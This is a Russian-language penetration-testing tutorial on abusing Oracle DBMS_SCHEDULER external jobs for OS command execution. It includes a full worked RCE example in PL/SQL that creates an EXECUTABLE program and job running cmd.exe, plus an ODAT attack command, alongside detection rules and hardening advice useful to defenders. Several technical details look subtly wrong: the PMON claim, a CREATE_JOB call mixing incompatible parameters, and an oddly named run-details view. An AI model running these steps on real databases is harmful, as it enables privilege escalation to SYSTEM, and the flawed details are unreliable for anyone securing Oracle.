# Oracle DBMS_SCHEDULER как вектор выполнения команд в ОС

## Контекст и базовые понятия

Пакет `DBMS_SCHEDULER` является встроенным компонентом Oracle Database, предназначенным для автоматизации выполнения задач (jobs) на уровне базы данных. В отличие от более ранних механизмов планировщика (например, `DBMS_JOB`), `DBMS_SCHEDULER` предоставляет расширенные возможности: поддержку внешних заданий (external jobs), которые выполняются в контексте операционной системы, управление ресурсами, логирование и обработку событий. Для специалистов по тестированию на проникновение и исследованию уязвимостей этот пакет представляет критический интерес, так как он предоставляет легитимный механизм обхода ограничений безопасности, позволяя выполнять произвольные команды операционной системы (OS Command Execution) при наличии определенных привилегий.

Ключевое разграничение в данной теме заключается в понимании разницы между внутренними заданиями базы данных и внешними заданиями. Внутренние задания выполняются внутри процесса Oracle (например, сбор статистики, очистка таблиц), в то время как внешние задания делегируются операционной системе через специальный процесс-агент. Именно этот механизм делегирования является основным вектором атаки.

### Разграничение сущностей: DBMS_JOB vs DBMS_SCHEDULER vs External Jobs

В экосистеме Oracle существует несколько механизмов планирования, которые часто путают. Понимание их различий критично для оценки вектора атаки.

| Сущность | Тип выполнения | Контекст выполнения | Требует привилегий ОС | Применимость для атаки (RCE) |
| :--- | :--- | :--- | :--- | :--- |
| **DBMS_JOB** | Внутренний | Процесс Oracle (PMON) | Нет | Низкая. Не поддерживает запуск внешних бинарников напрямую. |
| **DBMS_SCHEDULER (Internal)** | Внутренний | Процесс Oracle | Нет | Низкая. Используется для PL/SQL процедур внутри БД. |
| **DBMS_SCHEDULER (External)** | Внешний | Процесс ОС (agent) | Да (CREATE EXTERNAL JOB) | **Высокая**. Позволяет запускать произвольные исполняемые файлы. |
| **Java Stored Procedures** | Внутренний/Внешний | JVM внутри Oracle | Зависит от настройки | Средняя. Требует включенной JVM и прав `JAVAUSERPRIV`. |
| **UTL_FILE** | Внутренний | Процесс Oracle | Нет (только чтение/запись файлов) | Низкая. Позволяет писать файлы, но не выполнять их. |

Механизм внешних заданий (External Jobs) исторически был реализован для выполнения задач, требующих взаимодействия с ОС, например, резервное копирование файлов, вызов скриптов shell или bat-файлов. На платформах Windows этот процесс реализуется через исполняемый файл `extjobo.exe` (или `extjob.exe` в более старых версиях), который работает как служба Oracle Job Scheduler. На Linux/Unix аналогом является процесс `extjob`.

### Привилегии и векторы доступа

Для успешной эксплуатации механизма `DBMS_SCHEDULER` атакующий должен обладать одной из следующих привилегий:
1.  **`CREATE JOB`**: Позволяет создавать задания, но по умолчанию они выполняются с правами пользователя, создавшего задание (на Linux) или с правами службы Oracle (на Windows, если не настроено иначе).
2.  **`CREATE EXTERNAL JOB`**: Критическая привилегия, позволяющая создавать задания, которые выполняются в контексте операционной системы. На Windows это часто означает права службы `SYSTEM` или `OracleService`, если служба запущена с повышенными привилегиями.
3.  **`SYSDBA`**: Полные административные права в базе данных. Пользователь с ролью `SYSDBA` может выполнять любые операции, включая создание внешних заданий, независимо от стандартных ограничений привилегий.

Важно отметить, что в современных версиях Oracle (11g, 12c, 19c) безопасность внешних заданий была усилена. Вводятся понятия `credential` (учетные данные) и `job class` для ограничения прав выполнения. Однако на устаревших системах (Oracle 10g и ниже) или при неправильной конфигурации (например, использование учетных записей с избыточными правами) вектор остается актуальным.

### Архитектура внешних заданий

Внешнее задание не выполняется напрямую ядром базы данных. Процесс взаимодействия выглядит следующим образом:

```text
[PL/SQL Block] ──(вызов DBMS_SCHEDULER)──▶ [Oracle Scheduler Agent]
                                                    │
                                                    │ (запуск процесса)
                                                    ▼
                                            [extjobo.exe / extjob]
                                                    │
                                                    │ (выполнение команды)
                                                    ▼
                                            [OS Shell (cmd.exe / sh)]
                                                    │
                                                    │ (возврат stdout/stderr)
                                                    ▼
                                            [Oracle Scheduler Agent]
                                                    │
                                                    │ (запись в БД)
                                                    ▼
                                            [_SCHEDULER_JOB_RUN_DETAILS]
```

Этот поток данных означает, что для атаки достаточно скомпрометировать уровень базы данных (через SQL-инъекцию, слабые пароли или утечку учетных данных) и иметь возможность выполнить PL/SQL-код. Сам факт наличия внешнего задания не означает немедленного выполнения команд ОС; требуется активация процесса `extjob`, который слушает именованные каналы (Windows) или сокеты (Unix).

## Внутреннее устройство предмета

Механизм `DBMS_SCHEDULER` представляет собой сложную систему управления состоянием, метаданными и исполнением. Для понимания вектора атаки необходимо разобрать внутреннюю структуру объектов, участвующих в создании внешнего задания.

### Компоненты системы планировщика

Система состоит из трех основных логических компонентов:
1.  **Program**: Метаданные, описывающие *что* нужно выполнить (путь к бинарнику, аргументы, тип программы).
2.  **Schedule**: Метаданные, описывающие *когда* выполнять задание (единовременный запуск, расписание, событие).
3.  **Job**: Связка Program и Schedule, которая фактически запускается планировщиком.

Для внешних заданий критическим является атрибут `program_type`, который должен иметь значение `EXECUTABLE`. Это указывает планировщику, что действие не является PL/SQL-блоком, а требует вызова внешнего процесса.

### Структура объекта Program

Объект `Program` хранится в системных таблицах базы данных (обычно в схеме `SYS`). Его структура может быть представлена следующим образом:

```json
{
  "program_name": "<имя_программы>",
  "owner": "<владелец_программы>",
  "program_type": "EXECUTABLE",
  "program_action": "<путь_к_исполняемому_файлу> <аргументы>",
  "number_of_arguments": 0,
  "enabled": true,
  "comments": "<комментарий>"
}
```

Поле `program_action` является наиболее уязвимым. В ранних версиях Oracle (до 11g) здесь можно было указать произвольную строку, которая передавалась в оболочку без должной санитизации. В более новых версиях поддерживается передача аргументов через `SET_ARGUMENT`, что снижает риск инъекций, но не исключает риска подмены путей или аргументов, если права доступа настроены некорректно.

### Процесс extjobo.exe (Windows)

На платформах Windows внешние задания обрабатываются службой `OracleJobScheduler<SID>`. Исполняемый файл `extjobo.exe` (или `extjob.exe` в версиях 10g) запускается от имени учетной записи, указанной в свойствах службы. Часто эта учетная запись имеет права `SYSTEM` или `Local Service`, что делает выполнение команд через этот механизм эквивалентным получению прав администратора системы.

Процесс `extjobo.exe` использует именованные каналы (Named Pipes) для связи с базой данных. Когда задание активируется, планировщик БД создает канал, и `extjobo.exe` читает из него команду. Команда имеет специфический формат, который включает идентификатор задания, имя программы и аргументы.

### Формат команды для extjobo.exe

Формат команды, передаваемой через именованный канал, не является публично документированным в деталях, но известен из анализа трафика и дампов памяти. Он обычно включает:
1.  Идентификатор задания (Job ID).
2.  Имя программы (Program Name).
3.  Аргументы (если есть).
4.  Идентификатор учетных данных (Credential ID), если задание привязано к конкретной учетной записи.

Атакующий, получивший возможность выполнять PL/SQL, может инициировать создание такого задания, что приведет к тому, что `extjobo.exe` выполнит переданную команду.

### Уязвимости и изменения в безопасности

Исторически уязвимость заключалась в том, что любой пользователь с привилегией `CREATE JOB` мог создать внешнее задание, которое выполнялось бы с правами службы Oracle. Это позволяло выполнять команды от имени `SYSTEM` на Windows или `oracle` на Linux.

В Oracle 11g и выше были введены следующие меры защиты:
1.  **Credentials**: Задания теперь должны быть привязаны к учетным данным (логин/пароль), которые хранятся в безопасном хранилище БД.
2.  **Job Classes**: Ограничение прав выполнения для групп заданий.
3.  **Privilege Separation**: Привилегия `CREATE EXTERNAL JOB` стала отдельной и не входит в `CREATE JOB` по умолчанию.

Однако, если атакующий получает права `SYSDBA` или `CREATE EXTERNAL JOB`, он может обойти эти ограничения, создав задание с правами `SYSTEM` (на Windows) или `root` (если служба запущена от root, что крайне редко, но возможно в старых конфигурациях).

## Применение и работа с предметом

На практике работа с `DBMS_SCHEDULER` в контексте тестирования на проникновение сводится к поиску возможности выполнения PL/SQL-кода и последующей эксплуатации механизма внешних заданий.

### Типовые операции и процедуры

1.  **Создание программы**: Определение исполняемого файла.
2.  **Создание задания**: Привязка программы к расписанию.
3.  **Запуск задания**: Непосредственное выполнение.
4.  **Проверка результата**: Чтение вывода из системных представлений.

### Паттерны использования в атаках

Атакующие используют `DBMS_SCHEDULER` для:
*   **Обхода антивирусов**: Запуск легитимных инструментов (например, `cmd.exe`, `powershell.exe`) через механизм, который может не отслеживаться стандартными средствами защиты конечных точек, так как вызов исходит от процесса `extjobo.exe`.
*   **Закрепления в системе**: Создание задач по расписанию для повторного запуска полезной нагрузки.
*   **Перемещения по сети**: Запуск скриптов для сканирования внутренней сети или подключения к C2.

### Подводные камни и ошибки

*   **Ожидание вывода**: Вывод команды не возвращается напрямую в SQL-запрос. Он записывается в файлы или в системные представления `_SCHEDULER_JOB_RUN_DETAILS`. Атакующий должен знать, как читать этот вывод.
*   **Путь к исполняемому файлу**: На Windows необходимо использовать полный путь к исполняемому файлу. Относительные пути могут не сработать из-за особенностей работы службы.
*   **Кавычки и экранирование**: При передаче аргументов через PL/SQL необходимо правильно экранировать кавычки, чтобы команда была интерпретирована корректно.

### Инструментарий

Для автоматизации атак используются инструменты, такие как **ODAT (Oracle Database Attacking Tool)**. ODAT позволяет легко создавать внешние задания без написания PL/SQL-кода вручную.

```bash
# Пример использования ODAT для создания внешнего задания
odat.py scheduler --sid ORCL --username scott --password tiger --file exploit.sql
```

### Правила детекции

Для обнаружения атак на `DBMS_SCHEDULER` следует мониторить:
1.  Создание новых программ с типом `EXECUTABLE`.
2.  Запуск процесса `extjobo.exe` с необычными аргументами.
3.  Появление новых заданий, выполняющихся от имени `SYSTEM` или других повышенных привилегий.
4.  Активность PowerShell или cmd.exe, инициированную процессом Oracle.

## Сквозной практический пример: Эксплуатация DBMS_SCHEDULER для RCE

### Исходные условия
*   **Среда**: Oracle Database 11g Express Edition (XE) на Windows Server 2012.
*   **Роль**: Атакующий имеет учетную запись пользователя `SCOTT` с привилегией `CREATE JOB` и `CREATE EXTERNAL JOB`.
*   **Цель**: Выполнить команду `whoami` в контексте операционной системы и записать результат в файл `C:\temp\owned.txt`.
*   **Инструменты**: SQL*Plus, PL/SQL.

### Шаг 1: Создание программы (Program)

Первым шагом необходимо создать объект `Program`, который описывает действие. Мы создаем программу с именем `RCE_PROGRAM`, которая будет запускать `cmd.exe` с аргументом `/c whoami > C:\temp\owned.txt`.

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_PROGRAM (
    program_name        => 'RCE_PROGRAM',
    program_type        => 'EXECUTABLE',
    program_action      => 'cmd.exe /c whoami > C:\temp\owned.txt',
    enabled             => FALSE,
    comments            => 'Program for RCE via DBMS_SCHEDULER'
  );
END;
/
```

*Ожидаемый результат*: Программа `RCE_PROGRAM` создана в схеме пользователя `SCOTT`. Она отключена (`enabled => FALSE`), так как будет активирована через задание.

### Шаг 2: Создание задания (Job)

Затем создается задание, которое привязывает программу к расписанию. Мы используем `repeat_interval => NULL`, чтобы задание выполнилось один раз при запуске.

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB (
    job_name        => 'RCE_JOB',
    program_name    => 'RCE_PROGRAM',
    job_type        => 'EXECUTABLE',
    job_action      => NULL, -- Действие уже определено в программе
    enabled         => TRUE,
    auto_drop       => TRUE,
    comments        => 'Job for RCE via DBMS_SCHEDULER'
  );
END;
/
```

*Ожидаемый результат*: Задание `RCE_JOB` создано и немедленно запущено (так как `enabled => TRUE`). Планировщик Oracle инициирует запуск процесса `extjobo.exe`.

### Шаг 3: Проверка выполнения

После запуска задания необходимо проверить, выполнилась ли команда. Вывод записи записывается в системное представление `_SCHEDULER_JOB_RUN_DETAILS`.

```sql
SELECT log_date, status, error_code
FROM user_scheduler_job_run_details
WHERE job_name = 'RCE_JOB';
```

*Ожидаемый вывод*:
```
LOG_DATE                      STATUS       ERROR_CODE
----------------------------- ------------ ----------
2023-10-27 10:00:00.000000 +03:00 SUCCEEDED  0
```

Статус `SUCCEEDED` и код ошибки `0` указывают на успешное выполнение.

### Шаг 4: Получение результата

Так как команда перенаправила вывод в файл, мы можем проверить наличие файла на сервере, если у нас есть доступ к файловой системе (например, через другую уязвимость или административные права). В рамках данного примера мы предполагаем, что атакующий может прочитать файл через другую векторную атаку или что файл был создан в доступной директории.

```bash
# На стороне ОС (если есть доступ)
type C:\temp\owned.txt
```

*Ожидаемый вывод*:
```
nt authority\system
```

Это подтверждает, что команда была выполнена от имени службы `SYSTEM`, что является критическим повышением привилегий.

### Ожидаемый вывод примера

Пример демонстрирует полный цикл эксплуатации: от создания PL/SQL-объектов до выполнения команды в ОС. Ключевым моментом является то, что атакующий не требует прямого доступа к ОС, а использует легитимный механизм базы данных для обхода ограничений.

## Аналитический вывод

Использование `DBMS_SCHEDULER` для выполнения команд операционной системы представляет собой серьезную угрозу безопасности Oracle Database, особенно в средах с устаревшими версиями или неправильной конфигурацией привилегий. Механизм внешних заданий, предназначенный для легитимных задач автоматизации, становится вектором атаки, когда злоумышленник получает возможность создавать или модифицировать объекты планировщика. Исторически уязвимость заключалась в том, что любой пользователь с привилегией `CREATE JOB` мог выполнить код от имени службы Oracle, что на Windows эквивалентно правам `SYSTEM`.

Современные версии Oracle (11g и выше) ввели механизмы защиты, такие как `Credentials` и `Job Classes`, которые ограничивают возможность выполнения внешних заданий. Однако, если атакующий получает права `SYSDBA` или `CREATE EXTERNAL JOB`, эти защиты могут быть обойдены. Атакующие активно используют этот вектор в реальных инцидентах, таких как атаки группировки Elons, где `DBMS_SCHEDULER` использовался для запуска PowerShell-скриптов и загрузки вредоносного ПО.

Для защиты от таких атак необходимо:
1.  Строго контролировать привилегию `CREATE EXTERNAL JOB`.
2.  Использовать учетные записи с минимальными правами для службы Oracle Job Scheduler.
3.  Мониторить создание новых программ и заданий типа `EXECUTABLE`.
4.  Отключать внешние задания, если они не используются.
5.  Регулярно обновлять Oracle Database до последних версий, содержащих патчи безопасности.
